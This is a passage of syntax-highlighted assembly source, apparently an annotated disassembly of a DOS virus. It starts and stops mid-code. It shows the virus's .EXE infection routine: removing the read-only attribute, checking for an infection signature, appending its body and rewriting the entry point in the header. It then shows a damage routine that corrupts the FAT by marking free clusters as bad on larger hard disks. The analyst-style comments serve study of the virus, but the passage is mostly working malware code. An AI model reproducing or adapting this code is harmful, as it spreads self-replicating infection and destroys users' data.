        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       When an .EXE file is found, the virus starts by turning off</span><span class="sc0">
</span><span class="sc1">;       the read-only attribute. The read-only attribute is not restored</span><span class="sc0">
</span><span class="sc1">;       when the file has been infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">                </span><span class="sc1">; Get attribute</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L7</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">                </span><span class="sc1">; Set attribute</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0FEH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next, the file is examined to see if it is already infected.</span><span class="sc0">
</span><span class="sc1">;       The signature (4418 5F19) is stored in the last two words.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">                </span><span class="sc1">; Open / write access</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L7</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; file handle in BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; now DS is no longer needed</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The header of the file is read in at [ID+8]. The virus then</span><span class="sc0">
</span><span class="sc1">;       modifies itself, according to the information stored in the</span><span class="sc0">
</span><span class="sc1">;       header. (The original CS and IP addressed are stored).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1CH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">ORG_IP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1EH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">ORG_CS</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next the read/write pointer is moved to the end of the file-4,</span><span class="sc0">
</span><span class="sc1">;       and the last 4 bytes read. They are compared to the signature,</span><span class="sc0">
</span><span class="sc1">;       and if equal nothing happens.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L8A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L8A</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
 
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L11</span><span class="sc0">
</span><span class="sc5">L9</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">L10</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Compare to 4418,5F19</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L11</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4418H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L12</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5F19H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The file is not infected, so the next thing the virus does is</span><span class="sc0">
</span><span class="sc1">;       infecting it. First it is padded so the length becomes a multiple</span><span class="sc0">
</span><span class="sc1">;       of 16 bytes. Tis is probably done so the virus code can start at a</span><span class="sc0">
</span><span class="sc1">;       paragraph boundary.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L12</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">L13</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L12A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L12A</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next the main body of the virus is written to the end.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L13</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Next the .EXE file header is modified:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       First modify initial IP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">LABEL1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1CH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Modify starting CS = Virus CS. It is computed as:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       (Original length of file+padding)/16 - Start of load module</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1EH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Modify length mod 512</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L14</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L14</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">511</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">0AH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Modify number of blocks used</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">511</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L14A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L14A</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">0CH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Finally the modified header is written back to the start of the</span><span class="sc0">
</span><span class="sc1">;       file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">QQQ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">ENDIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">ENDIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">DAMAGE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Infection is finished - close the file and execute it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ENDIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc5">NEW21</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The damage routine. As before noted, it will only do damage on</span><span class="sc0">
</span><span class="sc1">;       systems with a hard disk larger than 10Mbytes (With 16 bit FAT)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TEMP</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Start by getting some information about the current drive, like size</span><span class="sc0">
</span><span class="sc1">;       of the FAT etc. Then compute the total number of sectors, and quit</span><span class="sc0">
</span><span class="sc1">;       unless it is greater than 20740. This is probably done since larger</span><span class="sc0">
</span><span class="sc1">;       disks use 16 bit FAT entries, instead of 12, which makes life easier</span><span class="sc0">
</span><span class="sc1">;       for the programmer.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DAMAGE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">32H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L21</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TEMP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0DH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TEMP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0BH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">L15A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L15A</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L15B</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">20740</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">     </span><span class="sc5">L21</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Check if DOS version is 4.0 or greater. If so, use a 16 bit value</span><span class="sc0">
</span><span class="sc1">;       for numbers of sectors in the FAT, otherwise use a 8 bit entry.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L15B</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">30H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">     </span><span class="sc5">L15</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0FH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">L16</span><span class="sc0">
</span><span class="sc5">L15</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0FH</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L16</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Read the last sector in the first copy of the FAT. Search backwards</span><span class="sc0">
</span><span class="sc1">;       for an unused entry. If none is found, read the sector before that</span><span class="sc0">
</span><span class="sc1">;       and so on. If no free entry is found on the entire disk then quit.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L20</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">25H</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L21</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">510</span><span class="sc0">
</span><span class="sc5">L17</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L19</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L18</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L17</span><span class="sc0">
</span><span class="sc5">L18</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">L21</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">L20</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       A free entry has been found. Make it look like a bad cluster, by</span><span class="sc0">
